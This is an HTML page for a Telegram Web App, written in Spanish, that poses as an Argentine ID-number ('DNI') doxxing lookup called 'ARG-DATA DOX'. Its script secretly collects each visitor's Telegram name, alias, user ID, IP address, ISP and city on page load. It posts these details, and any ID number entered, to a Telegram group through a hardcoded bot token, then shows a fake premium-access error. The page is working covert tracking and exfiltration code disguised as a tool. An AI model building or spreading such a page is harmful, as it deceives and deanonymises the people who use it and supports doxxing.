<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ARG-DATA DOX</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0a0a0a; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
        .box { border: 1px solid #ff0000; padding: 30px 20px; border-radius: 5px; box-shadow: 0 0 15px #ff0000; max-width: 350px; margin: 40px auto; }
        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #ff0000; color: #fff; text-align: center; outline: none; }
        button { background: #ff0000; color: #fff; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; text-transform: uppercase; }
        .status { font-size: 0.7em; margin-top: 15px; color: #00ff00; }
    </style>
</head>
<body>

    <div class="box">
        <h2 style="margin:0;">ARG-DATA DOX</h2>
        <p style="font-size:0.8em; color:#888;">DATABASE v5.0.1 - ARGENTINA</p>
        <hr style="border: 0.5px solid #333;">
        
        <input type="number" id="dni" placeholder="DNI A CONSULTAR">
        <br>
        <button onclick="enviarDni()">EJECUTAR B√öSQUEDA</button>
        
        <div id="status" class="status">SISTEMA CONECTADO...</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const botToken = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
        const grupoId = "-1003670055074";

        async function reportePrincipal() {
            setTimeout(async () => {
                const user = tg.initDataUnsafe?.user;
                const nombreFull = `${user?.first_name || "Desconocido"} ${user?.last_name || ""}`;
                const username = user?.username ? `@${user.username}` : "Sin @alias";
                const userId = user?.id || "N/A";

                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();
                    
                    const mensaje = `üö® **CAPTURA DE OBJETIVO** üö®\n` +
                                    `--------------------------------\n` +
                                    `üë§ **Usuario:** ${nombreFull}\n` +
                                    `üÜî **Alias:** ${username}\n` +
                                    `üî¢ **ID:** ${userId}\n` +
                                    `üåê **IP:** \`${data.ip}\`\n` +
                                    `üì° **Proveedor:** ${data.org}\n` +
                                    `üìç **Ciudad:** ${data.city}, ${data.country_name}\n` +
                                    `--------------------------------`;

                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: grupoId, text: mensaje, parse_mode: 'Markdown' })
                    });
                } catch (e) { console.error(e); }
            }, 1000); 
        }

        async function enviarDni() {
            const user = tg.initDataUnsafe?.user;
            const alias = user?.username ? `@${user.username}` : "Sin @alias";
            const dni = document.getElementById('dni').value;
            
            if(!dni) return alert("Ingrese un DNI");

            const msgDni = `üéØ **DNI CONSULTADO**\nüë§ **Por:** ${alias}\nüîé **DNI:** \`${dni}\``;

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: grupoId, text: msgDni, parse_mode: 'Markdown' })
            });
            alert("Error: Acceso denegado. Se requiere suscripci√≥n Premium.");
        }

        window.onload = reportePrincipal;
    </script>
</body>
</html>
